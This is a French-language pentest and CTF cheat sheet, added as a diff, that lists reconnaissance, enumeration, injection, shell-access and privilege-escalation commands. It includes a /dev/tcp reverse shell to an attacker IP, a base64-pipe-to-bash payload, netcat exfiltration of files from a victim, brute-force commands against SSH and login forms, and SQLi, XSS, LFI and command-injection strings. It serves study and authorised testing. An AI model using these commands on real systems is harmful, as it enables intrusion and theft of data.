@@ -1,0 +1,192 @@
+#########################################################
+#         🔐 GUIDE GÉNÉRAL PENTEST / CTF / AUDIT        #
+#########################################################
+
+PHASE 1 - PRÉPARATION & RECONNAISSANCE
+---------------------------------------
+
+1. Identifier son IP locale :
+    ifconfig     # ou : ip a
+
+2. Scanner le réseau local :
+    nmap -sn <IP>.1-254
+    netdiscover -r <IP>/24
+
+3. Scanner les ports d'une cible :
+    nmap -A -T4 -p- <IP>
+
+4. Identifier les services :
+    nmap -sV <IP>
+
+5. Vérifier si noms DNS détectés :
+    sudo nano /etc/hosts
+    # Exemple : 192.168.1.12 web.local
+
+6. Informations passives :
+    whois <domaine>
+    dig <domaine>
+    nslookup <domaine>
+
+7. Fingerprinting :
+    whatweb http://<IP>
+    wappalyzer (navigateur)
+
+PHASE 2 - ENUMÉRATION & ANALYSE WEB
+------------------------------------
+
+8. Enumération des répertoires :
+    gobuster dir -u http://<IP>/ -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+    dirb http://<IP>/
+    dirsearch -u http://<IP>/ -e php,html,txt
+
+9. Analyse manuelle :
+    - Inspecter le code source HTML
+    - robots.txt, .git, .env, .bak, config.php, etc.
+    - Fichiers d'erreur
+    - Injection dans les URL et paramètres
+
+10. Scanner vulnérabilités :
+    nikto -h <IP> -p 80
+
+11. Détection de CMS :
+    wpscan --url http://<IP>/ --enumerate u
+
+12. Bruteforce web (formulaire) :
+    hydra -l admin -P rockyou.txt <IP> http-post-form "/login.php:user=^USER^&pass=^PASS^:F=incorrect"
+
+13. BurpSuite (proxy d’analyse Web)
+    - Intercepter les requêtes HTTP (GET/POST)
+    - Copier les **cookies** ou les **requêtes complètes** pour SQLMap
+    - Rejouer, modifier, tester l’injection, fuzzing
+
+    Exemples utiles :
+    - Exporter la requête en format curl
+    - Intercepter un login, copier la requête POST
+    - Relever les headers : Cookie, Referer, Origin, etc.
+
+PHASE 3 - TESTS D’INJECTION / VULNÉRABILITÉS
+--------------------------------------------
+
+14. Injection SQL (manuelle) :
+    ' OR 1=1 --
+    admin' --
+
+15. SQLMap (automatisé) :
+
+    SQLMap simple :
+    sqlmap -u "http://<IP>/page.php?id=1" --batch
+
+    SQLMap avec cookie :
+    sqlmap -u "http://<IP>/page.php?id=1" --cookie="PHPSESSID=123abc;" --dbs
+
+    SQLMap avec requête POST :
+    sqlmap -u "http://<IP>/login.php" --data="username=admin&password=test" --cookie="PHPSESSID=..." --batch --dump
+
+16. XSS :
+    <script>alert(1)</script>
+
+17. LFI / RFI :
+    ../../../../etc/passwd
+    data://text/plain;base64,...
+
+18. SSTI :
+    {{7*7}} ou {{request}}
+
+19. Command injection :
+    ; whoami
+    & id
+    `uname -a`
+
+PHASE 4 - ACCÈS / SHELL / ÉVASION
+----------------------------------
+
+20. Reverse shell :
+
+Attaquant :
+    nc -lvnp 4444
+
+Victime :
+    bash -i >& /dev/tcp/<IP_KALI>/4444 0>&1
+    echo '<base64_payload>' | base64 -d | bash
+
+21. SSH (si identifiants trouvés ou bruteforce réussi) :
+
+Connexion :
+    ssh utilisateur@<IP>
+
+Exemple bruteforce (Hydra) :
+    hydra -l user -P rockyou.txt ssh://<IP>
+
+Connexion via clé privée :
+    ssh -i id_rsa user@<IP>
+    chmod 600 id_rsa
+
+22. Serveur de transfert (Kali) :
+    python3 -m http.server 8000
+
+23. Transfert de fichier via Netcat :
+    # Côté Kali (récepteur)
+    nc -nlvp 7777 > fichier.txt
+    # Côté victime
+    nc <IP_KALI> 7777 < fichier.txt
+
+PHASE 5 - POST-EXPLOITATION / PRIVESC
+--------------------------------------
+
+24. Vérifier les SUID :
+    find / -perm -4000 -type f 2>/dev/null
+
+25. Rechercher fichiers sensibles :
+    find / -name "*pass*" 2>/dev/null
+    cat ~/.bash_history
+    grep -i pass /etc/* -R 2>/dev/null
+
+26. Processus, services, ports :
+    ps auxf
+    systemctl --type=service
+    netstat -tulnp
+    ss -tuln
+
+27. Cronjobs :
+    crontab -l
+    cat /etc/crontab
+    ls -la /etc/cron*
+
+28. Sudo / droits root :
+    sudo -l
+    sudo su
+
+29. Binaires personnalisés :
+    ltrace ./binaire
+    strace ./binaire
+
+30. Outils de post-exploitation :
+    linpeas.sh
+    lse.sh
+    pspy
+
+PHASE 6 - OUTILS DE BASE À CONNAÎTRE
+--------------------------------------
+
+🛠️ Outils principaux :
+- nmap
+- netdiscover
+- gobuster / dirb / dirsearch
+- sqlmap
+- nikto
+- wpscan
+- hydra
+- whatweb
+- BurpSuite
+- metasploit
+- john / hashcat
+- smbclient / enum4linux
+- python3 -m http.server
+- nc (netcat)
+- ltrace / strace
+- linpeas / lse / pspy
+
+PHASE 7 - NOTES PERSO / AJOUTS
+-------------------------------
+
+
